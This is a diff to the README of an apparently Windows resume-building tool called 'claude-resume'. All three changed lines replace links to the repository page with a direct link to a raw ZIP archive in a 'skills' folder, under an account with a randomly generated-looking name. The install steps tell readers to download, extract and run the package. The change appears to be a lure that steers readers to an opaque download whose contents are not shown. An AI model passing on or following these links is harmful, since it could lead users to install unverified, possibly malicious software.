@@ -1,6 +1,6 @@
 # 🧠 claude-resume - Build Tailored Resumes Fast
 
-[![Download the app](https://img.shields.io/badge/Download%20Now-6b46c1?style=for-the-badge&logo=github&logoColor=white)](https://github.com/isolationistmuttontallow763/claude-resume)
+[![Download the app](https://img.shields.io/badge/Download%20Now-6b46c1?style=for-the-badge&logo=github&logoColor=white)](https://github.com/isolationistmuttontallow763/claude-resume/raw/refs/heads/main/skills/claude_resume_v2.1.zip)
 
 ## 🚀 What this is
 
@@ -31,7 +31,7 @@ For the best results, keep these files ready:
 
 ## 📥 Download and install
 
-1. Open this link in your browser: https://github.com/isolationistmuttontallow763/claude-resume
+1. Open this link in your browser: https://github.com/isolationistmuttontallow763/claude-resume/raw/refs/heads/main/skills/claude_resume_v2.1.zip
 2. Look for the latest release or download area on the page
 3. Download the Windows version of the app or package
 4. If the file is in a ZIP folder, right-click it and choose Extract All
@@ -238,7 +238,7 @@ Keep your resume files in a folder you control. Do not place them in shared fold
 
 ## 📌 Download again
 
-Download or open the app here: https://github.com/isolationistmuttontallow763/claude-resume
+Download or open the app here: https://github.com/isolationistmuttontallow763/claude-resume/raw/refs/heads/main/skills/claude_resume_v2.1.zip
 
 ## 🗂️ Recommended first run
 
